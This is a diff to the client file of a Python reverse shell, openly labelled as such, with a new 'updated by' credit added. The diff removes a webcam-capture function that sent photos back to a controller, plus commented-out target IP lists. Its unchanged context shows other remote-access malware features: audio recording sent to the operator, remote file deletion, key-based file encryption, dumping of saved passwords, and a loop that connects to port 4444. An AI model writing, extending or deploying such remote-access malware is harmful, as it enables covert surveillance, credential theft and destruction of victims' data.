@@ -3,6 +3,7 @@
 ##############################
 #   **python reverse shell**
 # coded by: oseid Aldary
+# updated by: Annor Gyimah
 ##############################
 #Client_FILE
 import struct,socket,subprocess,os,platform,webbrowser as browser
@@ -11,7 +12,6 @@ import time
 from datetime import timezone, datetime, timedelta
 import pyaudio
 import wave
-import cv2
 import shutil
 import sqlite3
 import sys
@@ -25,23 +25,6 @@ import json
 import smtplib
 from threading import Timer
 import contextlib
-
-# server_config
-#def read_ip_addresses_from_file(filename):
-    #with open(filename, 'r') as file:
-     #   ip_list = file.readlines()
-    #ip_list = [ip.strip() for ip in ip_list]
-    #return ip_list
-#IP = read_ip_addresses_from_file('ty.txt')
-
-#with open('ty.txt', 'r') as file:
-#    ip_list = file.readlines()
-#ip_list = [ip.strip() for ip in ip_list]
-#return ip_list
-#IP = ip_list
-
-#IP = "172.28.128.1" # Your server IP, default: localhost
-
 
 
 class senrev:
@@ -119,47 +102,6 @@ def screenshot():
 
 
 
-
-def webcam():
-#    """Takes a picture with bot's webcam and sends it to the master.\n"""
-    #
-    filename = str(datetime.now().time())
-
-    filename = filename.split(".")[0].replace(":", "-")
-   
-    video_capture = cv2.VideoCapture(0)
-    # Read picture. ret === True on success
-    ret, frame = video_capture.read()
-    # Close device
-    video_capture.release()
-    #cv2.imwrite('opencv' + '.png', frame)
-    filename = cv2.imwrite(filename + '.png', frame)
-
-
-    #with open(filename, "rb") as wf:
-    #    for data in iter(lambda: wf.read(4100), b""):
-    #        try:controler.send(data)
-    #        except(KeyboardInterrupt,EOFError):
-    #            wf.close()
-    #            controler.send(b":Aborted:")
-    #            return
-    #controler.send(b":DONE:")
-
-    controler.send(str.encode("webimage"))
-    BUFFER_SIZE = 1024
-    with open(filename, "rpw") as file:
-        while True:
-            file_data = file.read(BUFFER_SIZE)
-            if not file_data:
-                break
-            controler.send(file_data)
-    controler.send(str.encode("completeServing"))
-
-
-
-
-
-
 def recording():
     controler.send(str.encode("sound"))
     chunk = 1024
@@ -203,7 +145,6 @@ def recording():
 
     with open(filename, "rb") as file:
         while True:
-            #flie_data = file.read(chunk)
             file_data = file.read()
             if not file_data:
                 break
@@ -216,9 +157,6 @@ def recording():
 def delete(cmd):
      controler.send(str.encode("delete"))
      filetodel = "".join(cmd.split(":delete")).strip()
-     #if not os.path.isfile(filetodel): controler.send("error: open: '{}': No such file on clinet machine !\n".format(filetodel).encode("UTF-8"))
-     #filetodel = filetodown.split("/")[-1] if "/" in filetodel else filetodel.split("\\")[-1] if "\\" in filetodel else filetodel
-     #controler.send(str(os.getcwd()+os.sep+filetodel).encode("UTF-8"))
      try:
          os.remove(filetodel)
          print("Done Deleting")
@@ -244,11 +182,6 @@ def load_key():
     with open('key.key', 'rb') as key_file:
         key = key_file.read()
     return key
-
-# Example usage:
-#generate_key() # Only needs to be done once
-#encrypt() # Encrypts the file
-#decrypt() # Decrypts the file
 
 def encrypt_file(cmd):
     controler.send(str.encode("encrypt"))
@@ -393,7 +326,6 @@ def main():
 
 def savedpass():
   try:
-    #filename = os.environ.get("USERNAME")
     with open("savedpass.txt",'w') as f:
       with contextlib.redirect_stdout(f):
         print(main())
@@ -490,26 +422,6 @@ if not os.path.exists(location):
 
 '''
 
-
-
-
-
-
-
-#while True:
-#    try:
-#        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#        s.connect((IP, port))
-#        shell()
-#    except Exception: exit(1)
-
-#def read_ip_addresses_from_file(filename):
-#    with open(filename, 'r') as file:
-#        ip_list = file.readlines()
-#    ip_list = [ip.strip() for ip in ip_list]
-#    return ip_list
-#IPs = read_ip_addresses_from_file('hio.txt')
-#IPs = ['192.168.141.247', '172.25.80.1', '172.23.208.1','192.168.137.17','10.10.5.6','172.25.96.1','10.10.0.6',]
 IPs = ['127.0.0.1']
 port = 4444
 while True:
